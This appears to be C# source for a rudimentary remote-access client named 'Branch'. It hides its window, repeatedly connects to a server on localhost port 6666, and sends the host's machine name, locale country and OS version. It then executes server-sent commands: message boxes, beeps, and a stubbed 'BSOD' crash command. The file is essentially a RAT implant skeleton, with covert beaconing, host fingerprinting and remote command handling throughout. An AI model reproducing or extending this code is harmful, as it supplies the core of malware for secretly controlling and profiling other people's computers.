using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Globalization;

namespace Branch
{
    public partial class Branch : Form
    {
        private TcpClient client = new TcpClient();
        private TcpListener listener;
        private NetworkStream stream;
        private StreamReader reader;
        private StreamWriter writer;

        private object ThreadLock = new object();

        private enum cmds
        {
            Message = 1, Beep = 2, BSOD = 3
        }

        public Branch()
        {
            InitializeComponent();
        }

        private void Branch_Shown(object sender, EventArgs e)
        {
            this.Hide();
            for (;;)
            {
                ExtendBranch();
                Thread.Sleep(5000);
            }
        }


        private void ExtendBranch()
        {
            if (!client.Connected)
            {
                try
                {
                    client = new TcpClient("localhost", 6666);
                    stream = client.GetStream();
                    reader = new StreamReader(stream);
                    writer = new StreamWriter(stream);
                }
                catch (Exception err) { return; }
            }

            string CompName = Environment.MachineName.ToString();
            string OS = Environment.OSVersion.ToString();
            string culture = CultureInfo.CurrentCulture.EnglishName;
            string Country = culture.Substring(culture.IndexOf('(') + 1, culture.LastIndexOf(')') - culture.IndexOf('(') - 1);

            string SendData = CompName + "," + Country + "," + OS;
            writer.Write(SendData);

            try
            {
                string[] DeviceInfo = { Environment.MachineName, Environment.OSVersion.ToString() };

                writer.WriteLine(System.Environment.MachineName);
                writer.Flush();

                string line;
                int command = 0;
                while (true)
                {
                    line = "";
                    line = reader.ReadLine();

                    string breakpoint = "Break";

                    command = int.Parse(line);

                    
                    switch ((cmds)command)
                    {
                        case cmds.Beep:
                            try
                            {
                                string[] BeepMsg = reader.ReadLine().Split(',');
                                Thread BeepCmd = new Thread(() => Beep(BeepMsg));
                                BeepCmd.Start();
                            }
                            catch (Exception e) { Thread BeepCmd = new Thread(new ThreadStart(Beep));BeepCmd.Start(); }

                            break;
                        case cmds.BSOD:
                            break;
                        case cmds.Message:
                            string msg = reader.ReadLine();
                            Thread MsgCmd = new Thread(() => Message(msg));
                            MsgCmd.Start();
                            break;
                    }

                }
            }
            catch (Exception e)
            {
                
            }
        }


        private void ConnectClient(StreamWriter w)
        {
            string CompName = Environment.MachineName.ToString();
            string OS = Environment.OSVersion.ToString();
            string culture = CultureInfo.CurrentCulture.EnglishName;
            string Country = culture.Substring(culture.IndexOf('(') + 1, culture.LastIndexOf(')') - culture.IndexOf('(') - 1);

            string SendData = CompName + "," + Country + "," + OS;
            w.Write(SendData);
            w.Close();
        }

        private void Start(StreamReader r)
        {
            try
            {
                string line;
                int command = 0;
                while (true)
                {
                    line = "";
                    line = r.ReadLine();
                    command = int.Parse(line);

                    switch((cmds)command)
                    {
                        case cmds.Beep:
                            string[] BeepMsg = r.ReadLine().Split(',');
                            Thread BeepCmd = new Thread(() => Beep(BeepMsg));
                            BeepCmd.Start();
                            break;
                        case cmds.BSOD:
                            break;
                        case cmds.Message:
                            string msg = r.ReadLine();
                            Thread MsgCmd = new Thread(() => Message(msg));
                            MsgCmd.Start();
                            break;
                    }
                }
            }
            catch (Exception err) { }
        }

        private void Beep(string[] csv)
        {
            lock(ThreadLock)
            {
                int Freq = int.Parse(csv[0]);
                int Duration = int.Parse(csv[1]);

                Console.Beep(Freq, Duration);
            }
        }
        private void Beep()
        {
            lock(ThreadLock)
            {
                Console.Beep(2000, 500);
            }
        }

        private void Message(string message)
        {
            lock(ThreadLock)
            {
                MessageBox.Show(message);
            }
        }

    }
}
